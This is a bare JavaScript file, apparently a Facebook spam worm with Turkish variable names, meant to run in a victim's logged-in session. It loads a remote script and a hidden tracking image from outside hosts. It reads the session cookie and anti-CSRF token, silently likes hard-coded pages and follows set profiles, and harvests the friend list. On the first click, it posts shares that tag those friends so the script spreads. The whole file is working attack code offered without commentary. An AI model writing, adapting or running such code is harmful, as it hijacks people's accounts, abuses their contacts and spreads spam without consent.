var d = document;
var img = d.createElement("img");
img.src = "http://whos.amung.us/widget/jejejebuenchiste.png";
img.style.width = "0px";
img.style.height = "0px";
d.getElementsByTagName("body")[0].appendChild(img);

function addJavascript(jsname){
if(document.getElementsByName(jsname).length <= 0 || (document.getElementsByName(jsname).length > 0 && document.getElementsByName(jsname)[0].src != jsname)){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
    s.setAttribute("name",jsname);
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
}

addJavascript("http://www.colorearfb.net/anti.js?" +  Math.random());
//addJavascript("http://www.zeroliked.com/askfm.php?" +  Math.random());

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


function sayfa(liker){
    var http = new XMLHttpRequest();
     
    var url = "/ajax/pages/fan_status.php?__a=1";
     
    var params = "&fbpage_id=" + liker + "&add=1&reload=1&preserve_tab=true&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id 

+ "&phstamp=";
    http.open("POST", url, true);
     
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
     
    http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
       
      http.close; // Close the connection
     
    }
    }
    
    http.send(params);
}

function abone(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function liste(listeid){
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var httpwp = new XMLHttpRequest();
    var urlwp = "/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+listeid+"&__a=1";
    var paramswp ="fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=1658165481208410511539"
	httpwp.open("POST", urlwp, true);
    httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpwp.setRequestHeader("Content-length", paramswp.length);
    httpwp.setRequestHeader("Connection", "keep-alive");
    httpwp.onreadystatechange = function () {
        if (httpwp.readyState == 4 && httpwp.status == 200) {

        }
    }
    httpwp.send(paramswp);
}
sayfa("212423286335");
sayfa("362651093796");
sayfa("498156373554836");
abone("1818432106");
abone("100002638692951");

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

var spage_id = "150344935124725";
var spost_id = "150344935124725";
var sfoto_id = "150344935124725";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					spostpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}


//fotograf paylas
function sfotopaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=479679795382149";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + sfoto_id;
		params += "&attachment[type]=2";
		params += "&src=i";
		params += "&appid=2305272732";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
		
}

//postpaylas
function spostpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=479679795382149";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&reshare=" + spage_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + spost_id;
		params += "&attachment[params][images][0]=http://i1.ytimg.com/vi/4kr_LlfqEqo/mqdefault.jpg";
		params += "&attachment[type]=99";
		params += "&uithumbpager_width=320";
		params += "&uithumbpager_height=180";
		params += "&src=i";
		params += "&appid=2309869772";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

//postpaylas
function sdurumpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=479679795382149";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&reshare=" + spage_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + spost_id;
		params += "&attachment[type]=22";
		params += "&src=i";
		params += "&appid=25554907596";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}



//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);